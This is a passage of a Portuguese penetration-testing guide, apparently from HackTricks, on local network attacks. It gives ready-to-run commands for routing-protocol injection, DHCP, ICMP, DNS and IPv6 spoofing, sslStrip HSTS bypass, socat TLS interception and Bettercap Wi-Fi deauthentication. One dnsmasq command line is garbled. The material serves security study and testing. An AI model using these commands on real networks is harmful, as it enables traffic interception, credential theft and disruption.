**EIGRP (Enhanced Interior Gateway Routing Protocol)** é um protocolo de roteamento dinâmico. **É um protocolo distance-vector.** Se não houver **autenticação** e configuração de interfaces passivas, um **intruso** pode interferir no roteamento EIGRP e causar **envenenamento das tabelas de roteamento**. Além disso, a rede EIGRP (ou seja, o sistema autônomo) **é plana e não possui segmentação em zonas**. Se um **atacante injeta uma rota**, é provável que essa rota se **espalhe** por todo o sistema autônomo EIGRP.

Atacar um sistema EIGRP requer **estabelecer uma relação de vizinhança com um roteador EIGRP legítimo**, o que abre muitas possibilidades, desde reconhecimento básico até diversas injeções.

[**FRRouting**](https://frrouting.org/) permite implementar **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Tudo o que você precisa fazer é implantá-lo no sistema do atacante e você pode realmente se passar por um roteador legítimo no domínio de roteamento.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) tem capacidade para interceptar broadcasts EIGRP. Também permite a injeção de pacotes, que podem ser utilizados para alterar configurações de roteamento.

### OSPF

No Open Shortest Path First (OSPF) **a autenticação MD5 é comumente empregada para garantir comunicação segura entre roteadores**. No entanto, essa medida de segurança pode ser comprometida usando ferramentas como Loki e John the Ripper. Essas ferramentas são capazes de capturar e quebrar hashes MD5, expondo a chave de autenticação. Uma vez obtida essa chave, ela pode ser usada para introduzir novas informações de roteamento. Para configurar os parâmetros da rota e definir a chave comprometida, utilizam-se respectivamente as abas _Injection_ e _Connection_.

- **Captura e quebras de hashes MD5:** Ferramentas como Loki e John the Ripper são usadas para isso.
- **Configuração dos parâmetros da rota:** Feita através da aba _Injection_.
- **Definição da chave comprometida:** A chave é configurada na aba _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear tráfego de rede e encontrar vulnerabilidades
- Você pode encontrar algumas **mais informações sobre network attacks** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

O atacante configura todos os parâmetros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifique a [seção anterior](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste em enviar um ICMP packet type 1 code 5 que indica que o attacker é o melhor caminho para alcançar um IP. Então, quando a victim quiser contatar o IP, ela enviará o packet através do attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O attacker resolverá alguns (ou todos) os domínios que a victim solicitar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar seu próprio DNS com dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Frequentemente existem múltiplas rotas para sistemas e redes. Após construir uma lista de MAC addresses na rede local, use _gateway-finder.py_ para identificar hosts que suportam IPv4 forwarding.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para resolução de nomes local quando consultas DNS falham, sistemas Microsoft dependem de **Link-Local Multicast Name Resolution (LLMNR)** e do **NetBIOS Name Service (NBT-NS)**. De forma semelhante, implementações **Apple Bonjour** e **Linux zero-configuration** utilizam **Multicast DNS (mDNS)** para descobrir sistemas dentro de uma rede. Devido à natureza não autenticada desses protocolos e ao seu funcionamento sobre UDP, enviando mensagens em broadcast, eles podem ser explorados por atacantes que visam redirecionar usuários para serviços maliciosos.

Você pode se passar por serviços procurados pelos hosts usando o Responder para enviar respostas falsas.\
Leia aqui mais informações sobre [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browsers comumente empregam o protocolo **Web Proxy Auto-Discovery (WPAD) para adquirir automaticamente as configurações de proxy**. Isso envolve buscar detalhes de configuração em um servidor, especificamente através de uma URL como "http://wpad.example.org/wpad.dat". A descoberta desse servidor pelos clientes pode ocorrer por vários mecanismos:

- Através do **DHCP**, onde a descoberta é facilitada usando uma entrada de código especial 252.
- Pelo **DNS**, que envolve buscar por um hostname rotulado _wpad_ dentro do domínio local.
- Via **Microsoft LLMNR e NBT-NS**, que são mecanismos de fallback usados quando consultas DNS não obtêm sucesso.

A ferramenta Responder explora esse protocolo atuando como um **servidor WPAD malicioso**. Ela usa DHCP, DNS, LLMNR e NBT-NS para induzir clientes a se conectarem a ela. Para entender melhor como se passar por serviços usando o Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Você pode oferecer diferentes serviços na rede para tentar **enganar um usuário** a inserir algumas **credenciais em texto simples**. **Mais informações sobre este ataque em** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

Este ataque é muito semelhante ao ARP Spoofing, mas no mundo IPv6. Você pode fazer com que a vítima pense que o IPv6 do GW tem o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Alguns OS configuram por padrão o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como roteador IPv6 você pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Por padrão, alguns sistemas operacionais tentam configurar o DNS lendo um pacote DHCPv6 na rede. Então, um atacante pode enviar um pacote DHCPv6 para se configurar como DNS. O DHCP também fornece um IPv6 para a vítima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

Basicamente o que este ataque faz é: caso o **user** tente **access** uma página **HTTP** que está **redirecting** para a versão **HTTPS**. O **sslStrip** irá **maintain** uma **HTTP connection with** o **client** e uma **HTTPS connection with** o **server**, então será capaz de **sniff** a conexão em **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy para contornar HSTS

A **diferença** entre **sslStrip+ e dns2proxy** em relação a **sslStrip** é que eles irão **redirecionar**, por exemplo, _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (observe o **"w"** **extra**) e irão definir o **endereço desse domínio como o IP do atacante**. Dessa forma, o **cliente** irá **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores **sslstrip+** irá **manter** a **conexão real** via https com **www.facebook.com**.

O **objetivo** desta técnica é **evitar HSTS** porque _**wwww.facebook.com**_ **não** será salvo no **cache** do navegador, então o navegador será enganado a realizar a **autenticação do facebook via HTTP**.\
Note que, para realizar esse ataque, a vítima tem que tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e não https. Isso pode ser feito modificando os links dentro de uma página http.

Mais info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ não funciona mais. Isso ocorre porque existem regras HSTS pré-salvas nos navegadores, então mesmo que seja a primeira vez que um usuário acesse um domínio "importante" ele irá acessá-lo via HTTPS. Além disso, note que as regras pré-salvas e outras regras geradas podem usar a flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **então o** _**wwww.facebook.com**_ **exemplo de antes não funcionará mais, pois** _**facebook.com**_ **usa HSTS com `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen na porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen in port

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escutar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escutar usando certificado e redirecionar para os hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Às vezes, se o client verificar que a CA é válida, você poderia **servir um certificate de outro hostname assinado por uma CA**.\
Outro teste interessante é servir um c**ertificate do hostname solicitado mas self-signed**.

Outras coisas para testar são tentar assinar o certificate com um certificate válido que não é uma CA válida. Ou usar a public key válida, forçar o uso de um algorithm como diffie hellman (um que não precise decryptar nada com a real private key) e, quando o client solicitar uma probe da real private key (como um hash), enviar uma probe fake e esperar que o client não verifique isso.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

Tenha em conta que, quando um pacote UDP é enviado para um dispositivo que não possui a porta solicitada, é enviado um ICMP (Port Unreachable).

### **ARP discover**

Pacotes ARP são usados para descobrir quais IPs estão sendo usados dentro da rede. O PC tem que enviar uma requisição para cada endereço IP possível e somente aqueles que estão sendo usados irão responder.

### **mDNS (multicast DNS)**

Bettercap envia uma requisição MDNS (a cada X ms) pedindo por **\_services\_.dns-sd.\_udp.local**. A máquina que vê esse pacote normalmente responde a essa requisição. Depois, ele procura apenas máquinas que respondem a "services".

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap envia pacotes em broadcast para a porta 137/UDP perguntando pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap envia pacotes SSDP em broadcast procurando todo tipo de serviços (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap envia pacotes WSD em broadcast procurando por serviços (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referências

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
